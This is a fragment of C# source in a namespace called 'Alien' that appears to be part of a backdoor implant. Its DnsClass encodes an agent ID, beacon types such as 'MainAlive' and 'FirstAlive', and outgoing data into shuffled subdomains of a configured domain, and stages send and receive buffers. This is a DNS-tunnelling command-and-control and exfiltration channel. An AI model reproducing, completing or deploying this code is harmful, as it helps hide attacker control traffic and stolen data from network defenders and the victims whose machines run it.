using System;
using System.Linq;
using System.Net;

namespace Alien
{
	internal class DnsClass
	{
		private static void _DomainMaker(Enums.DomainType domainType, string data)
		{
			if (DnsClass._Try == 0)
			{
				if (domainType == Enums.DomainType.MainAlive)
				{
					DnsClass._Domain = Util.ConvertIntToDomain(Config.GetAgentID().Value);
				}
				else if (domainType == Enums.DomainType.FirstAlive)
				{
					DnsClass._Domain = Util.ConvertIntToDomain((int)domainType) + data;
				}
				else
				{
					DnsClass._Domain = Util.ConvertIntToDomain((int)domainType) + Util.ConvertIntToDomain(Config.GetAgentID().Value) + data;
				}
				string shuffle = Util.Shuffle(Config.GetCounter());
				DnsClass._Domain = Util.MapBaseSubdomainCharacters(DnsClass._Domain, shuffle) + Util.ConvertIntToCounter(Config.GetCounter()).PadLeft(3, Config.CharsCounter[0]) + "." + Config.GetDomain();
			}
		}


		public static void ReadySend(byte[] sendData)
		{
			DnsClass._SendByteIndex = 0;
			DnsClass._SendDataSize = sendData.Length;
			DnsClass._SendData = sendData;
		}

		
		private static string _Domain;
		private static int _Try;
		private static int _ReceiveDataSize;
		private static int _ReceiveByteIndex;
		private static byte[] _ReceiveData;
		private static int _SendDataSize;
		private static int _SendByteIndex;
		private static byte[] _SendData;
	}
}
